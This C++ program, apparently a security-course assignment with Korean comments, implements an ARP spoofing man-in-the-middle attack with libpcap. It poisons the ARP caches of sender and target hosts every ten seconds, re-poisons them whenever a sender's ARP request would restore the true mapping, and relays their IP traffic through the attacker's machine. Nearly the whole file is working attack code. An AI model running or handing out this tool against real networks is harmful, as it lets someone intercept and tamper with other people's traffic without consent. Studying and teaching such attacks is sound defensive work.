#include "spoof.h"
#include "hdr/ethhdr.h"
#include "hdr/arphdr.h"

#define JUMBOBUFSIZ 65535

int main(int argc, char* argv[]) {
    // 1. 인자 개수 검사
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    // 2. pcap 핸들 열기
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, JUMBOBUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "[Error] couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    printf("[Info] Device %s opened successfully.\n", dev);

    // 3. 내 MAC/IP 주소 얻기
    Mac myMac = getMyMac(dev);
    if (myMac.isNull()) {
        fprintf(stderr, "[Error] Failed to get MAC address for %s\n", dev);
        return -1;
    }
    Ip myIp = getMyIp(dev);

    // ============= 디버깅을 위한 출력 추가 =============
    printf("getMyMac() returned: %s\n", std::string(myMac).c_str());
    printf("getMyIp()  returned: %s\n", std::string(myIp).c_str());
    // =================================================

    // 4. 스푸핑 쌍 목록 생성
    vector<SpoofEntry> entries;
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i+1]);
        
        // 4-1. sender의 MAC 주소 획득
        Mac senderMac;
        if (!request_and_get_mac(pcap, myMac, myIp, senderIp, senderMac)) {
            printf("[Error] Failed to get MAC for sender: %s\n", string(senderIp).c_str());
            continue;
        }
        
        // 4-2. target의 MAC 주소 획득
        Mac targetMac;
        if (!request_and_get_mac(pcap, myMac, myIp, targetIp, targetMac)) {
            printf("[Error] Failed to get MAC for target: %s\n", string(targetIp).c_str());
            continue;
        }

        // 4-3. 스푸핑 엔트리 추가
        entries.push_back({senderIp, senderMac, targetIp, targetMac});
    }
    
    // 4-4. 스푸핑 엔트리가 없다면 종료
    if (entries.empty()) {
        fprintf(stderr, "[Error] No valid sender-target pairs found.\n");
        pcap_close(pcap);
        return -1;
    }

    chrono::steady_clock::time_point last_infect_time = chrono::steady_clock::now();

    // 5. 스푸핑 공격
    // 이번 과제의 핵심 로직
    // 주기적 감염 + ARP REQUEST 탐지 + 통신 relay
    while (true) {
        // 5-1. 주기적 감염(sender와 target 둘 다), 주기: 10초로 설정
        chrono::steady_clock::time_point now = chrono::steady_clock::now();
        if (chrono::duration_cast<chrono::seconds>(now - last_infect_time).count() >= 10) {
            for (SpoofEntry entry : entries) {
                printf("[Re-infecting] from sender(%s) to target(%s)...\n", string(entry.senderIp).c_str(), string(entry.targetIp).c_str());
                arp_attack(pcap, entry.senderMac, entry.senderIp, entry.targetIp, myMac); 
                arp_attack(pcap, entry.targetMac, entry.targetIp, entry.senderIp, myMac);
            }
            last_infect_time = now;
        }

        // 5-2. ARP recover 방지(re-spoofing 및 relay)
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
        if (res < 0) {
            fprintf(stderr, "[Error] pcap_next_ex return %d error=%s\n", res, pcap_geterr(pcap));
            break;
        }

        EthHdr* ethHdr = (EthHdr*)packet;

        for (SpoofEntry entry : entries) {
            // Sender -> ARP REQUEST(broadcast) 탐지, re-spoofing
            if (ethHdr->type() == EthHdr::ARP) {
                ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
                if (arpHdr->op() == ArpHdr::REQUEST && arpHdr->smac() == entry.senderMac) {
                    printf("[Re-spoofing] sender(%s) ARP request(broadcast) detected...\n", string(entry.senderIp).c_str());
                    arp_attack(pcap, entry.senderMac, entry.senderIp, entry.targetIp, myMac);
                }
            }
            // sender와 target의 통신 relay(최종 목적지(sender 혹은 target으로 알맞게 forwarding))
            else if (ethHdr->type() == EthHdr::IP4) {
                if (ethHdr->smac() == entry.senderMac && ethHdr->dmac() == myMac) {
                    printf("[Relaying] from sender(%s) to target(%s)...\n", string(entry.senderIp).c_str(), string(entry.targetIp).c_str());
                    ethHdr->dmac_ = entry.targetMac;
                    ethHdr->smac_ = myMac;
                    pcap_sendpacket(pcap, packet, header->len);
                } else if (ethHdr->smac() == entry.targetMac && ethHdr->dmac() == myMac) {
                    printf("[Relaying] from target(%s) to sender(%s)...\n", string(entry.senderIp).c_str(), string(entry.targetIp).c_str());
                    ethHdr->dmac_ = entry.senderMac;
                    ethHdr->smac_ = myMac;
                    pcap_sendpacket(pcap, packet, header->len);
                }
            }
        }
    }

    pcap_close(pcap);
    return 0;
}